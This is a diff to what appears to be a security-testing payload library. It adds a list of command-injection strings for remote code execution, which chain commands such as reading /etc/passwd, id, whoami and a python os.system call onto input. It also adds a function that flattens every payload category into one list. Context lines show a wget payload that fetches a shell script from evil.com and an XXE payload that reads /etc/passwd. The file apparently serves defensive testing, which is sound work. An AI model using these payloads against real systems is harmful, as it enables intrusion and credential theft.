@@ -102,6 +102,30 @@ COMMAND_INJECTION_PAYLOADS = [
     "& wget http://evil.com/shell.sh",
 ]
 
+# RCE (Remote Code Execution) Payloads
+RCE_PAYLOADS = [
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "&& cat /etc/passwd",
+    "`cat /etc/passwd`",
+    "$(cat /etc/passwd)",
+    "; ls -la",
+    "| ls -la",
+    "&& ls -la",
+    "; id",
+    "| id",
+    "&& id",
+    "; whoami",
+    "| whoami",
+    "&& whoami",
+    "; uname -a",
+    "| uname -a",
+    "&& uname -a",
+    "; python -c 'import os; os.system(\"id\")'",
+    "| python -c 'import os; os.system(\"id\")'",
+    "&& python -c 'import os; os.system(\"id\")'",
+]
+
 # XXE (XML External Entity) Payloads
 XXE_PAYLOADS = [
     "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
@@ -181,6 +205,7 @@ def get_all_malicious_payloads() -> Dict[str, List[str]]:
         'xss': XSS_PAYLOADS,
         'path_traversal': PATH_TRAVERSAL_PAYLOADS,
         'command_injection': COMMAND_INJECTION_PAYLOADS,
+        'rce': RCE_PAYLOADS,
         'xxe': XXE_PAYLOADS,
         'ssrf': SSRF_PAYLOADS,
         'file_upload': FILE_UPLOAD_PAYLOADS,
@@ -188,6 +213,12 @@ def get_all_malicious_payloads() -> Dict[str, List[str]]:
         'nosql_injection': NOSQL_INJECTION_PAYLOADS,
         'template_injection': TEMPLATE_INJECTION_PAYLOADS,
     }
+
+
+def get_all_malicious_payloads_flat() -> List[str]:
+    """Get all malicious payloads as a flat list"""
+    all_payloads = get_all_malicious_payloads()
+    return [payload for payloads in all_payloads.values() for payload in payloads]
 
 
 def generate_malicious_requests(
